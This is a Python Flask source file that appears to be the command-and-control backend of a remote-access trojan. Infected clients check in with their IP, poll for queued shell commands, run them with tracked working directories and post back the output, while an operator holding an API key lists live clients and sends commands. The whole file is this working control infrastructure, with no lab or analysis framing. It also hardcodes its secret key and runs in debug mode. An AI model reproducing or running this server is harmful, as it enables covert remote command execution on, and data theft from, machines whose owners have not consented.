from flask import Flask, request, jsonify
import time
import os

app = Flask(__name__)

API_SECRET_KEY = 'e116a88b20146059e79872e414c2c770982d1c6a28293774026330084f7b60e6'
app.secret_key = API_SECRET_KEY

CLIENT_STATUS = {}
PENDING_COMMANDS = {}
COMMAND_OUTPUTS = {}
LAST_SEEN_TIMEOUT = 120 

CLIENT_CWD = {} 
DEFAULT_CWD = '/' 

def check_auth(req):
    auth_header = req.headers.get('X-API-KEY')
    return auth_header == API_SECRET_KEY

def get_current_clients():
    active_clients = {}
    current_time = time.time()
    for uid, data in CLIENT_STATUS.items():
        if current_time - data.get('timestamp', 0) < LAST_SEEN_TIMEOUT:
            active_clients[uid] = data
    return active_clients

@app.route("/status-check", methods=["POST"])
def status_check():
    data = request.json
    user_id = data.get("user_id")
    if user_id:
        CLIENT_STATUS[user_id] = {"ip": data.get("ip"), "status": data.get("status"), "timestamp": time.time()}
        
        if user_id not in CLIENT_CWD:
            CLIENT_CWD[user_id] = DEFAULT_CWD
        
        return jsonify({"message": "Status received"}), 200
    return jsonify({"error": "Missing user_id"}), 400

@app.route("/get-command", methods=["GET"])
def get_command():
    user_id = request.args.get("user_id")
    
    command = PENDING_COMMANDS.pop(user_id, "none")
    cwd = CLIENT_CWD.get(user_id, DEFAULT_CWD)
    
    response = {"command": command, "cwd": cwd}
    
    if command != "none":
        CLIENT_CWD[user_id] = "PENDING"
        
    return jsonify(response), 200
@app.route("/post-output", methods=["POST"])
def post_output():
    data = request.json
    user_id = data.get("user_id")
    
    if user_id:
        output_entry = {"output": data.get("output"), "timestamp": data.get("timestamp")}
        COMMAND_OUTPUTS.setdefault(user_id, []).append(output_entry)
        new_cwd = data.get("cwd_after_command")
        if new_cwd and new_cwd != "error":
            CLIENT_CWD[user_id] = new_cwd
        elif new_cwd == "error":
            if CLIENT_CWD.get(user_id) == "PENDING":        
                 pass 

        return jsonify({"message": "Output received"}), 200
    return jsonify({"error": "Missing user_id"}), 400

@app.route("/list-clients", methods=["GET"])
def list_clients():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    return jsonify(get_current_clients()), 200

@app.route("/send-command", methods=["POST"])
def send_command():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    user_id = data.get("user_id")
    command = data.get("command")
    
    if user_id and command and user_id in get_current_clients():
        PENDING_COMMANDS[user_id] = command
        return jsonify({"message": f"Command '{command}' queued for {user_id}"}), 200
    
    if user_id not in get_current_clients():
        return jsonify({"error": "Client offline or unknown"}), 404
        
    return jsonify({"error": "Missing user_id or command"}), 400

@app.route("/get-output", methods=["GET"])
def get_output():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    
    user_id = request.args.get("user_id")
    if user_id:
        outputs = COMMAND_OUTPUTS.pop(user_id, [])
        return jsonify({"outputs": outputs}), 200
    return jsonify({"error": "Missing user_id"}), 400

if __name__ == "__main__":
    app.run(debug=True)
